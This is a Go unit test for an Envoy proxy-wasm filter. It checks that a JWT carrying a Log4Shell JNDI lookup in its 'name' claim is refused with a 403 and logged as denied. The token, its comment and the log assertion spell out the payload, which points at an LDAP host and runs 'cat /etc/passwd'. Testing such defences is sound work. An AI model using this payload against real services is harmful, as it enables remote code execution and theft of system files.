package main

import (
	"testing"

	"github.com/stretchr/testify/require"

	"github.com/tetratelabs/proxy-wasm-go-sdk/proxywasm/proxytest"
	"github.com/tetratelabs/proxy-wasm-go-sdk/proxywasm/types"
)

var (
	// malicious JWT token for log4shell with the following claim:
	// "name": "${jndi:ldap://log4shell:1389/exec/Y2F0IC9ldGMvcGFzc3dkCg==}"
	// This contains a payload that will execute `cat /etc/passwd` on the vulnerable machine
	malicious = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE4MDA1NjMyNTQsImlhdCI6MTY0Mjc3NTI1NCwiaXNzIjoiZXZpbC5jbyIsIm5hbWUiOiIke2puZGk6bGRhcDovL2xvZzRzaGVsbDoxMzg5L2V4ZWMvWTJGMElDOWxkR012Y0dGemMzZGtDZz09fSIsInN1YiI6Im5hY3gifQ.I59rKl-z5QGKsbT3W9PCDidFrkPrL-iwZFakWy0L0JY"
)

func TestHttpFilter_OnHttpRequestHeaders(t *testing.T) {
	opt := proxytest.NewEmulatorOption().WithVMContext(&vmContext{})
	host, reset := proxytest.NewHostEmulator(opt)
	defer reset()

	// Call OnPluginStart -> the metric is initialized.
	status := host.StartPlugin()
	// Check the status returned by OnPluginStart is OK.
	require.Equal(t, types.OnPluginStartStatusOK, status)

	// Create http context.
	contextID := host.InitializeHttpContext()

	// Call OnHttpRequestHeaders no user
	action := host.CallOnRequestHeaders(contextID, [][2]string{}, false)
	require.Equal(t, types.ActionContinue, action)

	action = host.CallOnRequestHeaders(contextID, [][2]string{
		{"Authorization", "Bearer " + malicious},
	}, false)
	localResponse := host.GetSentLocalResponse(contextID)
	require.Equal(t, types.ActionPause, action)
	require.NotNil(t, localResponse)
	require.Equal(t, uint32(403), localResponse.StatusCode)

	host.CompleteHttpContext(contextID)

	// Check Envoy logs.
	logs := host.GetInfoLogs()
	require.Contains(t, logs, "no authorization header found")
	require.Contains(t, logs, "access granted for: anonymous")
	require.Contains(t, logs, "access denied for: ${jndi:ldap://log4shell:1389/exec/Y2F0IC9ldGMvcGFzc3dkCg==}")
}
